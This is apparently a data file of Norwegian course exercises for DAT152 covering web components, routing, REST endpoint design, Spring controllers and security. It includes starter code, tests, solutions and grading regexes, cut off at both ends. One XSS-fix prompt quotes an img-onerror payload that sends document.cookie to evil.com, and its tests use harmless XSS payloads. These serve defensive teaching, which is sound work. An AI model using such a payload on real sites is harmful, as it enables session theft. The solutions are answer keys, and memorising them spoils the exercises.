        row.cells[1].textContent = examdata.date;
    }

    examupdateCallback(callback) {
        const id = Symbol("examupdate");
        this.#callbacks.set(id, callback);
        return id;
    }

    #onupdate(code) {
        const row = this.#tbody.querySelector(\`tr[data-code="\${code}"]\`);
        const examdata = { code: code, date: row.dataset.date };
        this.#callbacks.forEach(callback => callback(examdata));
    }
}
customElements.define('exam-list', ExamList);
`
});

DAT.exercises.push({
  id: "js-courseinfo",
  area: "js",
  type: "js",
  level: 2,
  title: "course-info: attributt, observedAttributes og API",
  source: "Eksamen h24 6a iv (variant)",
  prompt: `<p>Lag <code>&lt;course-info data-course="DAT152"&gt;</code> med shadow DOM (closed) som viser <code>&lt;p&gt;Course is &lt;span&gt;DAT152&lt;/span&gt;&lt;/p&gt;</code>.</p>
<ul><li>Kurskoden leses fra <code>data-course</code> når elementet monteres.</li>
<li>Endres attributtet senere, skal visningen oppdateres (<code>observedAttributes</code> + <code>attributeChangedCallback</code>).</li>
<li>Offentlig metode <code>setCourse(code)</code> setter kurskoden.</li></ul>`,
  starter: `const template = document.createElement("template");
template.innerHTML = "<p>Course is <span></span></p>";

class CourseInfo extends HTMLElement {

}
customElements.define("course-info", CourseInfo);
`,
  tests: `
const host = document.createElement("div");
host.innerHTML = '<course-info data-course="DAT152"></course-info>';
document.body.append(host);
const ci = host.querySelector("course-info");
const span = () => shadowOf(ci).querySelector("span");
test("Viser kurskoden fra data-course", async () => {
  assert(shadowOf(ci), "Ingen shadow DOM");
  assert(span() && span().textContent === "DAT152", "span viser: " + (span() && span().textContent));
});
test("Attributtendring oppdaterer visningen", async () => {
  ci.dataset.course = "DAT151";
  await sleep(10);
  assert(span().textContent === "DAT151", "Visningen ble ikke oppdatert – mangler observedAttributes?");
});
test("setCourse() fungerer", async () => {
  ci.setCourse("DAT100");
  assert(span().textContent === "DAT100", "setCourse virket ikke");
});
`,
  solution: `const template = document.createElement("template");
template.innerHTML = "<p>Course is <span></span></p>";

class CourseInfo extends HTMLElement {
    #shadow;
    #span;

    static get observedAttributes() {
        return ["data-course"];
    }

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: "closed" });
        this.#shadow.append(template.content.cloneNode(true));
        this.#span = this.#shadow.querySelector("span");
    }

    connectedCallback() {
        this.#span.textContent = this.dataset.course ?? "";
    }

    attributeChangedCallback(name, oldValue, newValue) {
        this.#span.textContent = newValue ?? "";
    }

    setCourse(code) {
        this.#span.textContent = code;
    }
}
customElements.define("course-info", CourseInfo);
`
});

DAT.exercises.push({
  id: "js-lifecycle",
  area: "js",
  type: "js",
  level: 1,
  title: "Få nettleseren til å kjøre disconnectedCallback",
  source: "Eksamen h25 5b ii",
  prompt: `<p><code>MessageElement</code> er gitt. Skriv kode <b>under</b> klassen som får nettleseren til å kjøre <code>connectedCallback()</code> og deretter <code>disconnectedCallback()</code>. Du skal <b>ikke</b> kalle metodene selv.</p>`,
  starter: `const template = document.createElement("template");
template.innerHTML = "<h1>Welcome to DAT152</h1>";

class MessageElement extends HTMLElement {
    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        shadow.appendChild(template.content.cloneNode(true));
    }
    connectedCallback() { console.log("connected"); }
    disconnectedCallback() { console.log("disconnected"); }
}
customElements.define('message-element', MessageElement);

// Your code here:

`,
  forbid: [{ re: "\\.(dis)?connectedCallback\\s*\\(", msg: "Du kaller callbacken direkte – nettleseren skal kalle den." }],
  tests: `
test("connectedCallback kjørte", async () => {
  await sleep(50);
  assert(__logs.includes("connected"), "Elementet ble aldri satt inn i dokumentet");
});
test("disconnectedCallback kjørte", async () => {
  assert(__logs.includes("disconnected"), "Elementet ble aldri fjernet fra dokumentet");
});
`,
  solution: `const template = document.createElement("template");
template.innerHTML = "<h1>Welcome to DAT152</h1>";

class MessageElement extends HTMLElement {
    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        shadow.appendChild(template.content.cloneNode(true));
    }
    connectedCallback() { console.log("connected"); }
    disconnectedCallback() { console.log("disconnected"); }
}
customElements.define('message-element', MessageElement);

const elm = document.createElement("message-element");
document.body.appendChild(elm);   // browser runs connectedCallback()
elm.remove();                     // browser runs disconnectedCallback()
`
});

DAT.exercises.push({
  id: "js-router",
  area: "js",
  type: "js",
  level: 2,
  title: "Hash-routing i ren JavaScript",
  source: "Eksamen v24 6a ii, h21, v26 5e",
  prompt: `<p>Lag en enkel SPA-router. Det finnes et element <code>&lt;main id="view"&gt;</code> på siden.</p>
<ul><li><code>#/home</code> → vis teksten <code>Home</code></li>
<li><code>#/courses</code> → vis <code>Courses</code></li>
<li>Alt annet → <code>Not found</code></li></ul>
<p>Visningen skal oppdateres når hash-delen endres (<code>hashchange</code>) – og ved start.</p>`,
  setup: `document.body.insertAdjacentHTML("afterbegin", '<main id="view"></main>');`,
  starter: `function render() {

}

`,
  tests: `
const view = () => document.getElementById("view").textContent.trim();
test("hashchange → #/courses viser Courses", async () => {
  location.hash = "#/courses";
  await sleep(80);
  assert(view() === "Courses", "Fikk: " + JSON.stringify(view()) + " – lytter du på hashchange?");
});
test("#/home viser Home", async () => {
  location.hash = "#/home";
  await sleep(80);
  assert(view() === "Home", "Fikk: " + JSON.stringify(view()));
});
test("Ukjent rute viser Not found", async () => {
  location.hash = "#/xyz";
  await sleep(80);
  assert(view() === "Not found", "Fikk: " + JSON.stringify(view()));
});
`,
  solution: `const routes = {
    "#/home": () => "Home",
    "#/courses": () => "Courses"
};

function render() {
    const view = routes[location.hash];
    document.getElementById("view").textContent = view ? view() : "Not found";
}

window.addEventListener("hashchange", render);
render();       // initial view on page load
`
});

DAT.exercises.push({
  id: "js-defineprop",
  area: "js",
  type: "js",
  level: 1,
  title: "Object.defineProperty: writable og enumerable",
  source: "Eksamen v24 6a iii–iv",
  prompt: `<p>Objektet <code>student</code> er gitt. Gjør <code>surename</code> <b>ikke skrivbar</b>, og legg til en egenskap <code>sid</code> med verdi <code>1234</code> som er <b>ikke-enumerable</b> (skal ikke vises i <code>Object.keys</code>).</p>`,
  starter: `const student = { firstname: "Ola", surename: "Nordmann" };

// your code

`,
  tests: `
test("surename er ikke skrivbar", async () => {
  try { student.surename = "Hansen"; } catch (e) {}
  assert(student.surename === "Nordmann", "surename ble endret");
});
test("sid finnes med verdi 1234", async () => {
  assert(student.sid === 1234, "student.sid er " + student.sid);
});
test("sid er ikke enumerable", async () => {
  assert(!Object.keys(student).includes("sid"), "sid vises i Object.keys");
});
`,
  solution: `const student = { firstname: "Ola", surename: "Nordmann" };

Object.defineProperty(student, "surename", { writable: false });
Object.defineProperty(student, "sid", { value: 1234, enumerable: false });
`
});

DAT.exercises.push({
  id: "js-xss-fix",
  area: "sec",
  type: "js",
  level: 1,
  title: "Fiks DOM-basert XSS",
  source: "Web security: XSS (klientside)",
  prompt: `<p>Funksjonen viser brukerkommentarer, men er sårbar for XSS fordi den bruker <code>innerHTML</code>. Skriv den om slik at kommentaren alltid vises som <b>tekst</b>. Forfatter skal fortsatt vises i <code>&lt;b&gt;</code>.</p>
<p class="small">Tenk: hva er konsekvensen hvis en angriper legger inn <code>&lt;img src=x onerror="fetch('https://evil.com?c='+document.cookie)"&gt;</code>?</p>`,
  setup: `document.body.insertAdjacentHTML("afterbegin", '<div id="comments"></div>');`,
  starter: `function showComment(author, comment) {
    const div = document.createElement("div");
    div.innerHTML = "<b>" + author + "</b>: " + comment;
    document.getElementById("comments").append(div);
}
`,
  tests: `
window.__pwned = 0;
test("Vanlig kommentar vises", async () => {
  showComment("Kari", "Nice post!");
  const t = document.getElementById("comments").textContent;
  assert(t.includes("Kari") && t.includes("Nice post!"), "Kommentaren vises ikke");
  assert(document.querySelector("#comments b") && document.querySelector("#comments b").textContent === "Kari", "Forfatter skal stå i <b>");
});
test("Payload i kommentar kjører ikke", async () => {
  showComment("Eve", '<img src=x onerror="window.__pwned=1">');
  await sleep(150);
  assert(!window.__pwned, "XSS kjørte!");
  assert(!document.querySelector("#comments img"), "<img> ble laget – data tolkes som HTML");
  assert(document.getElementById("comments").textContent.includes("<img"), "Payloaden skal vises som tekst");
});
test("Payload i forfatternavn kjører ikke", async () => {
  showComment('<svg onload="window.__pwned=2">', "hi");
  await sleep(150);
  assert(!window.__pwned && !document.querySelector("#comments svg"), "XSS via author!");
});
`,
  solution: `function showComment(author, comment) {
    const div = document.createElement("div");
    const b = document.createElement("b");
    b.textContent = author;                       // safe sink
    div.append(b, ": " + comment);                // strings become Text nodes
    document.getElementById("comments").append(div);
}
`
});

DAT.exercises.push({
  id: "js-password",
  area: "sec",
  type: "js",
  level: 2,
  title: "Passordpolicy ved registrering",
  source: "Web security: «enforce strong password during registration»",
  prompt: `<p>Skriv <code>validatePassword(password, username)</code> som returnerer <code>true</code> bare hvis:</p>
<ul><li>minst 12 og maks 128 tegn,</li><li>minst én liten bokstav, én stor bokstav, ett siffer og ett spesialtegn,</li>
<li>ikke inneholder brukernavnet (uansett store/små bokstaver),</li><li>ikke finnes i <code>COMMON</code> (sammenlign i små bokstaver).</li></ul>
<p class="small">I Java blir dette det samme med <code>Pattern</code> – logikken er det som teller.</p>`,
  starter: `const COMMON = ["password123!", "qwerty123456!", "welcome2024!a", "summer2025!!a"];

function validatePassword(password, username) {

}
`,
  tests: `
const cases = [
  ["Kort1!", "ola", false, "for kort"],
  ["alllowercase123!", "ola", false, "mangler stor bokstav"],
  ["ALLUPPERCASE123!", "ola", false, "mangler liten bokstav"],
  ["NoDigitsHere!!!", "ola", false, "mangler siffer"],
  ["NoSpecials12345", "ola", false, "mangler spesialtegn"],
  ["MyOlaPassword1!", "ola", false, "inneholder brukernavn"],
  ["Password123!", "kari", false, "vanlig passord (COMMON)"],
  ["Correct-Horse-Battery-9", "kari", true, "gyldig"],
  ["Bergen#Regn2026", "per", true, "gyldig"],
  ["A1!" + "a".repeat(130), "per", false, "for langt"]
];
for (const [pw, user, expected, why] of cases) {
  test(JSON.stringify(pw.length > 30 ? pw.slice(0, 20) + "…" : pw) + " → " + expected + " (" + why + ")", async () => {
    const got = validatePassword(pw, user);
    assert(got === expected, "Fikk " + got);
  });
}
`,
  solution: `const COMMON = ["password123!", "qwerty123456!", "welcome2024!a", "summer2025!!a"];

function validatePassword(password, username) {
    if (typeof password !== "string") return false;
    if (password.length < 12 || password.length > 128) return false;
    if (!/[a-z]/.test(password)) return false;
    if (!/[A-Z]/.test(password)) return false;
    if (!/\\d/.test(password)) return false;
    if (!/[^A-Za-z0-9]/.test(password)) return false;
    if (username && password.toLowerCase().includes(username.toLowerCase())) return false;
    if (COMMON.includes(password.toLowerCase())) return false;
    return true;
}
`
});

/* ============================ ENDEPUNKT-TABELLER ============================ */

DAT.exercises.push({
  id: "ep-student",
  area: "wf",
  type: "endpoints",
  level: 1,
  title: "Endepunkter: Student–Course",
  source: "Eksamen v26 1b (og h24 1a)",
  prompt: `<p>Fyll inn URI og HTTP-metode for hver tjeneste. Base-URL <code>/studapp/api/v1</code> trenger du ikke skrive. Bruk <code>{sid}</code> og <code>{cid}</code> for id-er.</p>`,
  rows: [
    { service: "Register/create a profile", method: "POST", accept: ["students"] },
    { service: "View details about own profile", method: "GET", accept: ["students/{}"] },
    { service: "Update profile information", method: "PUT", accept: ["students/{}"], alsoMethod: ["PATCH"] },
    { service: "Register for a new course", method: "POST", accept: ["students/{}/courses"] },
    { service: "Withdraw from a course", method: "DELETE", accept: ["students/{}/courses/{}"] },
    { service: "List all registered courses", method: "GET", accept: ["students/{}/courses"] },
    { service: "View details of a registered course", method: "GET", accept: ["students/{}/courses/{}"] }
  ]
});

DAT.exercises.push({
  id: "ep-shop",
  area: "wf",
  type: "endpoints",
  level: 2,
  title: "Endepunkter: E-shop (kunder og staff)",
  source: "Eksamen h25 1b",
  prompt: `<p>Customer–Order–Product. Kunder bestiller produkter; staff administrerer produkter. Base <code>/shopapp/api/v1</code>.</p>`,
  rows: [
    { service: "Customer: Register/create a profile", method: "POST", accept: ["customers"] },
    { service: "Customer: View own profile", method: "GET", accept: ["customers/{}"] },
    { service: "Customer: Update profile", method: "PUT", accept: ["customers/{}"], alsoMethod: ["PATCH"] },
    { service: "Customer: Make an order for a product", method: "POST", accept: ["customers/{}/orders", "customers/{}/products/{}/orders"] },
    { service: "Customer: Update an order", method: "PUT", accept: ["customers/{}/orders/{}"], alsoMethod: ["PATCH"] },
    { service: "Customer: List all orders", method: "GET", accept: ["customers/{}/orders"] },
    { service: "Customer: View a selected order", method: "GET", accept: ["customers/{}/orders/{}"] },
    { service: "Customer: Delete an order", method: "DELETE", accept: ["customers/{}/orders/{}"] },
    { service: "Staff: List all customers", method: "GET", accept: ["customers"] },
    { service: "Staff: Create new product", method: "POST", accept: ["products"] },
    { service: "Staff: Update a product", method: "PUT", accept: ["products/{}"], alsoMethod: ["PATCH"] },
    { service: "Staff: Delete a product", method: "DELETE", accept: ["products/{}"] },
    { service: "Staff: List all products", method: "GET", accept: ["products"] },
    { service: "Staff: View a product", method: "GET", accept: ["products/{}"] }
  ]
});

DAT.exercises.push({
  id: "ep-hotel",
  area: "wf",
  type: "endpoints",
  level: 2,
  title: "Endepunkter: HotelOnline",
  source: "Eksamen h23 1a",
  prompt: `<p>Hotel, Customer, Booking (en booking tilhører en kunde og et hotell). Base <code>/hotelonline/api/v1</code>.</p>`,
  rows: [
    { service: "List all hotels", method: "GET", accept: ["hotels"] },
    { service: "Details of a hotel", method: "GET", accept: ["hotels/{}"] },
    { service: "Create a hotel", method: "POST", accept: ["hotels"] },
    { service: "Update a hotel", method: "PUT", accept: ["hotels/{}"], alsoMethod: ["PATCH"] },
    { service: "Delete a hotel", method: "DELETE", accept: ["hotels/{}"] },
    { service: "List all customers", method: "GET", accept: ["customers"] },
    { service: "Details of a customer", method: "GET", accept: ["customers/{}"] },
    { service: "Create a customer", method: "POST", accept: ["customers"] },
    { service: "Update a customer", method: "PUT", accept: ["customers/{}"], alsoMethod: ["PATCH"] },
    { service: "Delete a customer", method: "DELETE", accept: ["customers/{}"] },
    { service: "List all bookings", method: "GET", accept: ["bookings"] },
    { service: "Details of a specific booking", method: "GET", accept: ["bookings/{}", "customers/{}/bookings/{}"] },
    { service: "Customer books a hotel", method: "POST", accept: ["customers/{}/bookings", "customers/{}/hotels/{}/bookings"] },
    { service: "Customer updates a booking", method: "PUT", accept: ["customers/{}/bookings/{}"], alsoMethod: ["PATCH"] },
    { service: "Customer cancels a booking", method: "DELETE", accept: ["customers/{}/bookings/{}"] },
    { service: "List all bookings by a customer", method: "GET", accept: ["customers/{}/bookings"] }
  ]
});

DAT.exercises.push({
  id: "ep-sensor",
  area: "wf",
  type: "endpoints",
  level: 2,
  title: "Endepunkter: SensorLoc",
  source: "Eksamen v24 1a",
  prompt: `<p>Location har mange Sensors; hver sensor sender Measurements. Base <code>/sensorloc/api/v1</code>.</p>`,
  rows: [
    { service: "List all locations", method: "GET", accept: ["locations"] },
    { service: "Details of a location", method: "GET", accept: ["locations/{}"] },
    { service: "Create a location", method: "POST", accept: ["locations"] },
    { service: "Update a location", method: "PUT", accept: ["locations/{}"], alsoMethod: ["PATCH"] },
    { service: "Delete a location", method: "DELETE", accept: ["locations/{}"] },
    { service: "Create a sensor", method: "POST", accept: ["sensors", "locations/{}/sensors"] },
    { service: "List all sensors", method: "GET", accept: ["sensors", "locations/{}/sensors"] },
    { service: "Details of a sensor", method: "GET", accept: ["sensors/{}", "locations/{}/sensors/{}"] },
    { service: "Update a sensor", method: "PUT", accept: ["sensors/{}", "locations/{}/sensors/{}"], alsoMethod: ["PATCH"] },
    { service: "Delete a sensor", method: "DELETE", accept: ["sensors/{}", "locations/{}/sensors/{}"] },
    { service: "All measurements for all sensors in a location", method: "GET", accept: ["locations/{}/measurements"] },
    { service: "Measurements for a sensor in a location", method: "GET", accept: ["locations/{}/measurements/{}", "locations/{}/sensors/{}/measurements"] }
  ]
});

/* ============================ SPRING / JAVA (sjekkliste) ============================ */

const PATH = (p) => '@(Get|Post|Put|Delete|Patch|Request)Mapping\\s*\\(\\s*(value\\s*=\\s*|path\\s*=\\s*)?"' + p + '"';
const ID = "\\{\\w+\\}";

DAT.exercises.push({
  id: "sp-studentcontroller",
  area: "wf",
  type: "rubric",
  lang: "java",
  level: 3,
  title: "StudentController med riktige statuskoder",
  source: "Eksamen v26 1c",
  prompt: `<p>Implementer <code>StudentController</code> for alle 7 endepunktene fra «Endepunkter: Student–Course». Service-metodene:</p>
<pre><code>Student saveStudent(Student student)
Student findById(Long sid)
Student updateStudent(Student student, Long sid)
Set&lt;Course&gt; saveCourse(Long sid, Course course)
Set&lt;Course&gt; findCourses(Long sid)
Course findCourse(Long sid, Long cid)
Set&lt;Course&gt; deleteCourse(Long sid, Long cid)</code></pre>
<p>Unntak: <code>StudentNotFoundException</code>, <code>CourseNotFoundException</code>. Ikke tenk på sikkerhet ennå.</p>`,
  starter: `@RestController
@RequestMapping("/studapp/api/v1")
public class StudentController {

    // Write your controller methods here

}
`,
  checks: [
    { label: "@RestController og @RequestMapping(\"/studapp/api/v1\")", re: '@RestController[\\s\\S]*@RequestMapping\\s*\\(\\s*"/studapp/api/v1"|@RequestMapping\\s*\\(\\s*"/studapp/api/v1"[\\s\\S]*@RestController' },
    { label: "StudentService injiseres med @Autowired", re: "@Autowired\\s+(private\\s+)?StudentService\\s+\\w+" },
    { label: "POST /students → saveStudent → 201 CREATED", method: ["@PostMapping\\s*\\(\\s*(value\\s*=\\s*)?\"/students\"", "saveStudent\\s*\\(", "CREATED", "@RequestBody"] },
    { label: "GET /students/{sid} → findById → 200 OK", method: ['@GetMapping\\s*\\(\\s*(value\\s*=\\s*)?"/students/' + ID + '"', "findById\\s*\\(", "OK", "@PathVariable"] },
    { label: "PUT /students/{sid} → updateStudent", method: ['@PutMapping\\s*\\(\\s*(value\\s*=\\s*)?"/students/' + ID + '"', "updateStudent\\s*\\(", "@RequestBody", "@PathVariable"] },
    { label: "POST /students/{sid}/courses → saveCourse → 201", method: ['@PostMapping\\s*\\(\\s*(value\\s*=\\s*)?"/students/' + ID + '/courses"', "saveCourse\\s*\\(", "CREATED"] },
    { label: "GET /students/{sid}/courses → findCourses", method: ['@GetMapping\\s*\\(\\s*(value\\s*=\\s*)?"/students/' + ID + '/courses"', "findCourses\\s*\\("] },
    { label: "GET /students/{sid}/courses/{cid} → findCourse", method: ['@GetMapping\\s*\\(\\s*(value\\s*=\\s*)?"/students/' + ID + '/courses/' + ID + '"', "findCourse\\s*\\("] },
    { label: "DELETE /students/{sid}/courses/{cid} → deleteCourse", method: ['@DeleteMapping\\s*\\(\\s*(value\\s*=\\s*)?"/students/' + ID + '/courses/' + ID + '"', "deleteCourse\\s*\\("] },
    { label: "Bruker ResponseEntity med HttpStatus", re: "ResponseEntity[\\s\\S]*HttpStatus\\.\\w+" },
    { label: "Tom liste → NO_CONTENT (som i kursets løsninger)", re: "isEmpty\\s*\\(\\s*\\)[\\s\\S]{0,120}NO_CONTENT", weight: 0.5 },
    { label: "Deklarerer throws StudentNotFoundException / CourseNotFoundException", re: "throws[^{]*StudentNotFoundException" },
    { label: "Ingen verb i URI-ene (f.eks. /getStudent)", not: '"/[^"]*(get|create|delete|update|add|remove)[A-Z][^"]*"' }
  ],
  solutionRef: "controllers"
});

DAT.exercises.push({
  id: "sp-preauthorize",
  area: "wf",
  type: "rubric",
  lang: "java",
  level: 2,
  title: "Beskytt StudentController med @PreAuthorize",
  source: "Eksamen v26 1d II (h25 1d II)",
  prompt: `<p>Roller i JWT: <code>ADMIN</code> (staff) og <code>USER</code> (student). Student-id er tilgjengelig som <code>authentication.details.sid</code>.</p>
<ol><li>En autentisert student får bare tilgang til <b>egne</b> data og kurs.</li><li>Staff får tilgang til alle studenters kurs.</li></ol>
<p>Legg til annotasjoner på metodene under.</p>`,
  starter: `@RestController
@RequestMapping("/studapp/api/v1")
public class StudentController {

    @Autowired
    private StudentService studentService;

    @PostMapping("/students")
    public ResponseEntity<Object> createStudent(@RequestBody Student student) {
        return new ResponseEntity<>(studentService.saveStudent(student), HttpStatus.CREATED);
    }

    @GetMapping("/students/{sid}")
    public ResponseEntity<Object> getStudentProfile(@PathVariable("sid") Long sid) throws StudentNotFoundException {
        return new ResponseEntity<>(studentService.findById(sid), HttpStatus.OK);
    }

    @GetMapping("/students/{sid}/courses")
    public ResponseEntity<Object> getCourses(@PathVariable("sid") Long sid) throws StudentNotFoundException {
        return new ResponseEntity<>(studentService.findCourses(sid), HttpStatus.OK);
    }

    @GetMapping("/students/{sid}/courses/{cid}")
    public ResponseEntity<Object> getCourse(@PathVariable("sid") Long sid, @PathVariable("cid") Long cid)
            throws StudentNotFoundException, CourseNotFoundException {
        return new ResponseEntity<>(studentService.findCourse(sid, cid), HttpStatus.OK);
    }

    @DeleteMapping("/students/{sid}/courses/{cid}")
    public ResponseEntity<Object> withdrawCourse(@PathVariable("sid") Long sid, @PathVariable("cid") Long cid)
            throws StudentNotFoundException, CourseNotFoundException {
        return new ResponseEntity<>(studentService.deleteCourse(sid, cid), HttpStatus.OK);
    }
}
`,
  checks: [
    { label: "Bruker @PreAuthorize", re: "@PreAuthorize\\s*\\(" },
    { label: "GET /students/{sid}: ADMIN eller eier", method: ['@GetMapping\\s*\\(\\s*"/students/' + ID + '"\\s*\\)', "@PreAuthorize[^\\n]*ADMIN", "@PreAuthorize[^\\n]*(authentication\\.details\\.sid\\s*==\\s*#\\w+|#\\w+\\s*==\\s*authentication\\.details\\.sid)"] },
    { label: "GET .../courses: ADMIN eller eier", method: ['@GetMapping\\s*\\(\\s*"/students/' + ID + '/courses"', "@PreAuthorize[^\\n]*ADMIN", "@PreAuthorize[^\\n]*authentication\\.details\\.sid"] },
    { label: "GET .../courses/{cid}: ADMIN eller eier", method: ['@GetMapping\\s*\\(\\s*"/students/' + ID + '/courses/' + ID + '"', "@PreAuthorize[^\\n]*ADMIN", "@PreAuthorize[^\\n]*authentication\\.details\\.sid"] },
    { label: "DELETE .../courses/{cid}: ADMIN eller eier", method: ['@DeleteMapping\\s*\\(\\s*"/students/' + ID + '/courses/' + ID + '"', "@PreAuthorize[^\\n]*ADMIN", "@PreAuthorize[^\\n]*authentication\\.details\\.sid"] },
    { label: "Eierskapsregelen kombineres med or (ADMIN or …)", re: "ADMIN'\\)\\s*or\\s|\\sor\\s+hasAuthority\\('ADMIN'\\)|\\sor\\s+hasRole\\('ADMIN'\\)" },
    { label: "#sid matcher parameternavnet sid", re: "#sid\\b" },
    { label: "Ikke bare hasAuthority('USER') alene på student-ressurser (IDOR)", not: "@PreAuthorize\\s*\\(\\s*\"hasAuthority\\('USER'\\)\"\\s*\\)\\s*@GetMapping\\s*\\(\\s*\"/students/\\{" }
  ],
  solutionText: `@PostMapping("/students")            // registration: open, or hasAnyAuthority('ADMIN','USER')
public ResponseEntity<Object> createStudent(...)

@GetMapping("/students/{sid}")
@PreAuthorize("hasAuthority('ADMIN') or (hasAuthority('USER') and #sid == authentication.details.sid)")
public ResponseEntity<Object> getStudentProfile(@PathVariable("sid") Long sid) ...

@GetMapping("/students/{sid}/courses")
@PreAuthorize("hasAuthority('ADMIN') or (hasAuthority('USER') and #sid == authentication.details.sid)")
...

@GetMapping("/students/{sid}/courses/{cid}")
@PreAuthorize("hasAuthority('ADMIN') or (hasAuthority('USER') and #sid == authentication.details.sid)")
...

@DeleteMapping("/students/{sid}/courses/{cid}")
@PreAuthorize("hasAuthority('ADMIN') or (hasAuthority('USER') and #sid == authentication.details.sid)")
...
// Requires @EnableMethodSecurity on a @Configuration class.`
});

DAT.exercises.push({
  id: "sp-productcontroller",
  area: "wf",
  type: "rubric",
  lang: "java",
  level: 2,
  title: "ProductController (staff) med sikkerhet",
  source: "Eksamen h25 1c II + 1d II",
  prompt: `<p>ProductService: <code>saveProduct(Product)</code>, <code>updateProduct(Product, Long pid)</code>, <code>findAll()</code>, <code>deleteById(Long pid)</code>, <code>findProductById(Long pid)</code>. Unntak <code>ProductNotFoundException</code>.</p>
<p>Staff (<code>ADMIN</code>) kan opprette/oppdatere/slette. Både ADMIN og USER kan liste og se produkter. Base <code>/shopapp/api/v1</code>.</p>`,
  starter: `@RestController
@RequestMapping("/shopapp/api/v1")
public class ProductController {

}
`,
  checks: [
    { label: "@Autowired ProductService", re: "@Autowired\\s+(private\\s+)?ProductService\\s+\\w+" },
    { label: "POST /products → saveProduct → 201, kun ADMIN", method: ['@PostMapping\\s*\\(\\s*(value\\s*=\\s*)?"/products"', "saveProduct", "CREATED", "@PreAuthorize[^\\n]*ADMIN"] },
    { label: "PUT /products/{pid} → updateProduct, kun ADMIN", method: ['@PutMapping\\s*\\(\\s*(value\\s*=\\s*)?"/products/' + ID + '"', "updateProduct", "@PreAuthorize[^\\n]*ADMIN"] },
    { label: "DELETE /products/{pid} → deleteById, kun ADMIN", method: ['@DeleteMapping\\s*\\(\\s*(value\\s*=\\s*)?"/products/' + ID + '"', "deleteById", "@PreAuthorize[^\\n]*ADMIN"] },
    { label: "GET /products → findAll (ADMIN og USER)", method: ['@GetMapping\\s*\\(\\s*(value\\s*=\\s*)?"/products"', "findAll", "@PreAuthorize[^\\n]*(USER|isAuthenticated)"] },
    { label: "GET /products/{pid} → findProductById", method: ['@GetMapping\\s*\\(\\s*(value\\s*=\\s*)?"/products/' + ID + '"', "findProductById"] },
    { label: "Tom liste → NO_CONTENT", re: "isEmpty\\s*\\(\\s*\\)[\\s\\S]{0,120}NO_CONTENT", weight: 0.5 },
    { label: "throws ProductNotFoundException der det trengs", re: "throws[^{]*ProductNotFoundException" }
  ],
  solutionText: `@RestController
@RequestMapping("/shopapp/api/v1")
public class ProductController {

    @Autowired
    private ProductService productService;

    @GetMapping("/products")
    @PreAuthorize("hasAnyAuthority('ADMIN','USER')")
    public ResponseEntity<Object> getProducts() {
        List<Product> products = productService.findAll();
        if (products.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(products, HttpStatus.OK);
    }

    @GetMapping("/products/{pid}")
    @PreAuthorize("hasAnyAuthority('ADMIN','USER')")
    public ResponseEntity<Object> getProduct(@PathVariable("pid") Long pid)
            throws ProductNotFoundException {
        Product product = productService.findProductById(pid);
        return new ResponseEntity<>(product, HttpStatus.OK);
    }

    @PostMapping("/products")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> createProduct(@RequestBody Product product) {
        Product nproduct = productService.saveProduct(product);
        return new ResponseEntity<>(nproduct, HttpStatus.CREATED);
    }

    @PutMapping("/products/{pid}")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> updateProduct(@RequestBody Product product,
                                                @PathVariable("pid") Long pid)
            throws ProductNotFoundException {
        Product uproduct = productService.updateProduct(product, pid);
        return new ResponseEntity<>(uproduct, HttpStatus.OK);
    }

    @DeleteMapping("/products/{pid}")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> deleteProduct(@PathVariable("pid") Long pid)
            throws ProductNotFoundException {
        productService.deleteById(pid);
        return new ResponseEntity<>(HttpStatus.OK);      // or NO_CONTENT
    }
}`
});

DAT.exercises.push({
  id: "sp-customerservice",
  area: "wf",
  type: "rubric",
  lang: "java",
  level: 3,
  title: "CustomerService med bookinger (service-laget)",
  source: "Eksamen h23 1b II",
  prompt: `<p>Gitt <code>Customer</code> med <code>getBookings()</code>, <code>addBooking(b)</code>, <code>removeBooking(b)</code> og</p>
<pre><code>public interface CustomerRepository extends CrudRepository&lt;Customer, Long&gt; {
    List&lt;Customer&gt; findAll();
    Optional&lt;Customer&gt; findById(Long id);
    Customer save(Customer customer);
    void delete(Customer customer);
}</code></pre>
<p>Skriv <code>CustomerService</code> med: saveCustomer, findAll, findById (kaster CustomerNotFoundException), updateCustomer, deleteCustomer, findBookings, addBooking, findBooking (kaster BookingNotFoundException), cancelBooking.</p>`,
  starter: `@Service
public class CustomerService {

}
`,
  checks: [
    { label: "@Autowired CustomerRepository", re: "@Autowired\\s+(private\\s+)?CustomerRepository\\s+\\w+" },
    { label: "findById bruker Optional + orElseThrow(CustomerNotFoundException)", re: "findById\\s*\\([^)]*\\)[\\s\\S]{0,40}\\.orElseThrow\\s*\\([\\s\\S]{0,80}CustomerNotFoundException" },
    { label: "saveCustomer bruker repository.save", re: "save\\s*\\(\\s*customer\\s*\\)" },
    { label: "updateCustomer sjekker at kunden finnes først", method: ["updateCustomer", "findById\\s*\\(", "save\\s*\\("] },
    { label: "deleteCustomer bruker repository.delete", method: ["deleteCustomer", "\\.delete\\s*\\("] },
    { label: "addBooking: addBooking() på kunden + save", method: ["addBooking\\s*\\(\\s*Long", "\\.addBooking\\s*\\(", "save\\s*\\("] },
    { label: "findBooking kaster BookingNotFoundException", method: ["findBooking", "BookingNotFoundException"] },
    { label: "cancelBooking: removeBooking() + save", method: ["cancelBooking|deleteBooking", "removeBooking\\s*\\(", "save\\s*\\("] }
  ],
  solutionRef: "controllers"
});

DAT.exercises.push({
  id: "sp-i18n",
  area: "g11n",
  type: "rubric",
  lang: "java",
  level: 2,
  title: "Spring i18n-konfigurasjon",
  source: "Pensum: «internationalize a given web app with Spring (steps)»",
  prompt: `<p>Skriv en <code>@Configuration</code>-klasse som:</p>
<ol><li>definerer en <code>LocaleResolver</code>-bean som lagrer valgt språk i en <b>cookie</b>, med engelsk som standard,</li>
<li>definerer en <code>LocaleChangeInterceptor</code> som reagerer på parameteren <code>lang</code>,</li>
<li>registrerer interceptoren.</li></ol>
<p>Skriv også én linje Thymeleaf som viser nøkkelen <code>welcome.hello</code> med brukernavnet som parameter.</p>`,
  starter: `@Configuration
public class I18nConfig implements WebMvcConfigurer {

}

<!-- Thymeleaf: -->
`,
  checks: [
